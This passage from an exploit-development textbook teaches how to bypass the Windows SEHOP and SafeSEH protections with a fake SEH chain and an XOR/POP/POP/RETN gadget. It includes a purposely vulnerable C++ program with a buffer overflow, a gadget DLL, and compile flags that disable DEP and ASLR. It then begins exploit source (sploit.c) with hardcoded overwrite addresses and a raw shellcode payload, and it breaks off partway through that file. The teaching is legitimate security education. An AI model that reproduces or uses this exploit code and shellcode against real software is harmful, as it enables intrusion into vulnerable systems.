
- RETN

These instructions replicate what is stored in EMET.dll.

As the Sysdream team explained, the last requirement is not as hard as it sounds—this is often the case at the end of functions that need to return a zero or NULL value; in that case, EAX is XOR'ed and the function returns.

![](img/5f597c6a70133069118d9e804ace3775_358_0.png)

NOTE You can use !mona fw -s xor eax, eax # pop * # pop * # ret -m <module> to search for the required sequence, but you may need to experiment with different wildcards.

As shown in Figure 13-4, a fake SEH chain will be placed on the stack, and the last record will be the actual location of the system default exception handler.

![](img/5f597c6a70133069118d9e804ace3775_359_0.png)

Figure 13-4 Sysdream.com technique to bypass SEHOP (used with permission)

The key difference between this technique and the traditional SafeSEH technique is the use of the JE (74) “conditional jump if equal to zero” instruction instead of the traditional JMP short (EB) instruction. The JE instruction (74) takes one operand, a single byte, used as a signed integer offset. Therefore, if you wanted to jump backward 10 bytes, you would use a 74 F7 opcode. Now, because we have a short assembly instruction that may also be a valid memory address on the stack, we can make this attack happen. As shown in Figure 13-4, we will overwrite the “Next SEH” pointer with a valid pointer to memory that we control and where we will place the fake SEH record containing an actual address to the system default exception handler. Next, we will overwrite the “SEH handler” pointer with an address to the XOR/POP/POP/RETN sequence in a module/DLL that is not SafeSEH protected. This will have the desired effect of setting the zero bit in the special register and will make our JE (74) instruction execute and jump backward into our NOP sled. At this point, we will ride the sled into the next opcode EB 08, which will jump forward, over the two pointer addresses, and continue in the next NOP sled. Finally, we will jump over the last SEH record and into the real shellcode.

To summarize, our attack in this case looks like this:

- NOP sled
- EB 08 (or EB 0A to jump over both addresses)
- Next SEH: the address we control on the stack ending with (negative byte) 74
- SEH handler: the address to an XOR/POP/POP/RETN sequence in a non-SafeSEH module
- NOP sled
- EB 08 (or EB 0A to jump over both addresses)
- At the address just given: 0xFFFFFFFF
- Actual system default exception handler
- Shellcode

To demonstrate this exploit, we will use the following vulnerable program (with SafeSEH protection) and associated DLL (no SafeSEH protection):

![](img/5f597c6a70133069118d9e804ace3775_360_0.png)

NOTE Although this is a canned program, it is indicative of programs found in the wild. This program will be used to bypass /GS, SafeSEH, and SEHOP protections. Feel free to try and run this program yourself.

```cpp
// fool.cpp : Defines the entry point for the console application.
#include "stdafx.h"
#include "stdio.h"
#include "windows.h"

extern "C" __declspec(dllimport)void test();

void GetInput(char* str, char* out)
{
    long lSize;
    char buffer[500];
    char * temp;
    FILE * hFile;
    size_t result;
    try {
        hFile = fopen(str, "rb"); //open file for reading of bytes
        if (hFile==NULL) {printf("No such file"); exit(1);} //error checking
        //get size of file
        fseek(hFile, 0, SEEK_END);
        lSize = ftell(hFile);
        rewind (hFile);
        temp = (char*) malloc (sizeof(char)*lSize);
        result = fread(temp,1,lSize,hFile);
        memcpy(buffer, temp, result); //vulnerability
        memcpy(out,buffer,strlen(buffer)); //triggers SEH before /GS
        printf("Input received : %s\n",buffer);
    }
    catch (char * strErr)
    {
        printf("No valid input received ! \n");
        printf("Exception : %s\n",strErr);
    }
    test(); //calls DLL, demonstration of XOR, POP, POP, RETN sequence
}

int main(int argc, char* argv[])
{
    char foo[2048];
    char buf2[500];
    GetInput(argv[1],buf2);
    return 0;
}
```

Next, we will show the associated DLL of the foo1.c program:

```cpp
// foo1DLL.cpp : Defines the exported functions for the DLL application.
//This DLL simply demonstrates XOR, POP, POP, RETN sequence
//may be found in the wild with functions that return a Zero or NULL value

#include "stdafx.h"

extern "C" int __declspec(dllexport) test() {
    __asm
    {
        xor eax, eax
        pop esi
        pop ebp
        retn
    }
}
```

This program and DLL may be created in Visual Studio 2017 Community Edition. The main foo1.c program was compiled with /GS and /SafeSEH protection (which adds SEHOP), but not DEP (/NXCOMPAT) or ASLR (/DYNAMICBASE) protection. The DLL was compiled with only /GS protection. If SEHOP seems to be missing, you may enable it with EMET.

![](img/5f597c6a70133069118d9e804ace3775_362_0.png)

NOTE The foo1 and foo1dll files may be compiled from the command line by removing the reference to stdafx.h and using the following command-line options:

```
cl /LD /GS foo1DLL.cpp /link /SafeSEH:no /DYNAMICBASE:no /NXCompat:no
```

```
cl /GS /EHsc foo1.cpp foo1DLL.lib /link /SafeSEH /DYNAMICBASE:no /NXCompat:no
```

After compiling the programs, let’s look at them in OllyDbg, or Immunity Debugger, and verify the DLL does not have /SafeSEH protection and that the program does. We will use the OllySSEH plug-in, shown next, which you can find on the Downloads page at OpenRCE.org. Mona can do the same with the aforementioned fw (find wildcard) command.

![](img/5f597c6a70133069118d9e804ace3775_362_1.png)

Next, let’s search for the XOR/POP/POP/RETN sequence in our binary, as shown next:

![](img/5f597c6a70133069118d9e804ace3775_363_0.png)

![](img/5f597c6a70133069118d9e804ace3775_363_1.png)

NOTE Various good plug-ins are available for OllyDbg and Immunity Debugger that can do this search for you. You can also manually search by pressing CTRL-S in the dissassembler pane and putting in the exact desired instructions.

Now, using the address we discovered, let's craft the exploit in a program, which we will call sploit.c. This program creates the attack buffer and writes it to a file so it can be fed to the vulnerable program. This code is based on the Sysdream.com team code but was heavily modified, as mentioned in the credit comment at the beginning of the code.

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

/*
Credit: Heavily modified code from:
Stéfan LE BERRE (s.leberre@sysdream.com)
Damien CAUQUIL (d.cauquil@sysdream.com)
http://ghostsinthestack.org/
http://virtualabs.fr/
http://sysdream.com/
*/

// finding this next address takes trial and error in ollydbg or other debugger
char nseh[] = "\\x74\\x4f\\x12\\x00"; //pointer to 0xFFFFFFFF, then Final EH
char seh[] = "\\x7E\\x13\\x01\\x10"; //pointer to xor, pop, pop, ret

/* Shellcode size: 227 bytes */
char shellcode[] = "\\xb8\\x29\\x15\\xd8\\x8f\\x29\\xc9\\xb1\\x33\\xdd"
"\\xc2\\xd9\\x74\\x24\\xf4\\x5b\\x31\\x43\\x0e\\x03"
"\\x43\\x0e\\x83\\xea\\x11\\x3a\\x02\\x10\\xf1\\x33"
"\\xed\\xe8\\x02\\x24\\x67\\xd0\\x33\\x76\\x13\\x46"
"\\x66\\x46\\x57\\x0a\\x8b\\x2d\\x35\\xbe\\x18\\x43"
"\\x92\\xb1\\xa9\\xee\\xc4\\xfc\\x2a\\xdf\\xc8\\x52"
"\\xe8\\x41\\xb5\\xa8\\xd3\\xa2\\x84\\x63\\x30\\xa3"
"\\xc1\\x99\\xbb\\xf1\\x9a\\xd6\\xe6\\xe6\\xaf\\xaa"
"\\xb2\\x07\\x60\\xa1\\x8b\\x7f\\x05\\x75\\x7f\\xca"
"\\x04\\xa5\\xd0\\x41\\x4e\\x5d\\x5a\\x0d\\x6f\\x5c"
"\\x8f\\xd4\\x53\\x17\\xa4\\xa6\\x27\\xa6\\x6c\\x7f"
"\\xc8\\x99\\x50\\x54\\xf7\\x16\\x5d\\xa4\\x3f\\x90"
"\\xbe\\xd3\\x4b\\xe3\\x43\\xe4\\x8f\\x9e\\x9f\\x61"
"\\x12\\x38\\x6b\\xd1\\xf6\\xb9\\xb8\\x84\\x7d\\xb5"
"\\x75\\xc2\\xda\\x9d\\x88\\x07\\x51\\xe5\\x01\\xa6"
"\\xb6\\x6c\\x51\\x8d\\x12\\x35\\x01\\xac\\x93\\x99"
"\\xe4\\xd1\\x54\\x7b\\x58\\x74\\x1e\\x69\\x8d\\x0e"
"\\x7d\\xe7\\x50\\x82\\xfb\\x4e\\x52\\x9c\\x03\\xe0"
"\\x3b\\xad\\x88\\x6f\\x3b\\x32\\x5b\\xd4\\xa3\\xd0"
"\\x4e\\x20\\x4c\\xd4\\x1b\\x89\\x11\\x6e\\xf1\\xcd"
"\\x2f\\xed\\xf0\\xad\\xcb\\xed\\x70\\xa8\\x90\\xa9"
"\\x69\\xc0\\x89\\x5f\\x8e\\x77\\xa9\\x75\\xed\\x16"
"\\x39\\x15\\xdc\\xbd\\xb9\\xbc\\x20";
```
